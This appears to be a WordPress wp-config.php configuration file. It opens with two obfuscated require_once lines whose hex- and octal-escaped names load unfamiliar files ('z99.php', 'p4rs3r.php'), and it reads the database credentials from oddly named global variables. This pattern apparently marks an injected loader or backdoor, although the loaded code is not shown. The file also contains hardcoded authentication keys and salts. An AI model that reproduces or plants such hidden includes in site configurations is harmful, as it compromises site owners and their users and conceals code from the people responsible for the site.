<?php

require_once ("\x7a\x39\071.\x70\150p");
require_once ("\160\064\162\x733r.\x70\x68p");
global $URD41gkDq, $AjF45gcBM, $eDa42ghLl, $key, $kVf30gIUo, $lVS47g9PD, $BNd44gS7o, $cEF48gFDY, $sNz43gE54, $SZP40gkZJ, $ble49g73K;
global $XLZ18gG1g, $bAN13g609, $LPV14gp9V, $Piq15gG3A, $aEd16gbVY, $mEb17gi81, $qoO19gAUz;
global $OdO10gEiB, $FNGbgKPZ3, $jTtcgMMUE, $JRHdg7niZ, $VcDegoLHH, $poGfgcg4G, $mtU11g8fs;
global $XnP3g6CaJ, $bZH3bgEIm, $Xbp1Wz9Q;
global $nob3agmdG;
global $KGF46grkr, $oGq24gO8N, $bpT23gGZ4;
global $orV21gLEa, $eSn1fg4kZ, $aYM22gfc5, $Eos1egq1Z, $dkO20g6Z4;
global $rFR34gbTR, $Ckn1dgOMR;
global $HgM2fgaUK, $MIG3cgrYi; 

/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', $poGfgcg4G);

/** MySQL database username */
define('DB_USER', $JRHdg7niZ);

/** MySQL database password */
define('DB_PASSWORD', $VcDegoLHH);

/** MySQL hostname */
define('DB_HOST', $FNGbgKPZ3);

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         ' 4J+qc5:89-c;HElE*T-N;sUi*rQ:Q#W3+b%%cqGw424q*g(M5c x4G|G/VH~3=}');
define('SECURE_AUTH_KEY',  'r*7kdw;QkSYl(Qo}iZ1YY<yrBGB/5l]LUe.lHxz[`?kRc]L?5,M6,?pr3W)- C;L');
define('LOGGED_IN_KEY',    'l&|VJ_1G.f0q?bLd,uZ0=HxKD@Y|P,vI7XCZx^-/61j:>zi>0CV{Q^}empb~vLx$');
define('NONCE_KEY',        'v62 j6gT_tL)C<3#CZa}#+fju(w@<vF3YUVSG1Y4S2]KW$mJG:gRug$^K Qli,V*');
define('AUTH_SALT',        '<0f2cOya*Zq$9odVn?)BhTM7|;Gzuc/_}N*D-n2BFNg4JW:6qdz9<-LUb#Q!!]!.');
define('SECURE_AUTH_SALT', '?qsBGv5fx%ufbV_jB{ugYl>&;[Er1aTq%Y4&AeT/fqmkCHx@`yDXUI|A7xbJw;d]');
define('LOGGED_IN_SALT',   'R3Mj6rpjfMFd.xOAIa%%E2w(W4OD4Xy}Q.IF.h-wsL~a2-,h:Fy{.M7yz%V._`~S');
define('NONCE_SALT',       'd3g@qHzrp^8+XQF9;C8B:D(j~Cr+L*wh<6@mK~eb[Ng1I?*Y(wI[9@dFOW^UPf^6');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');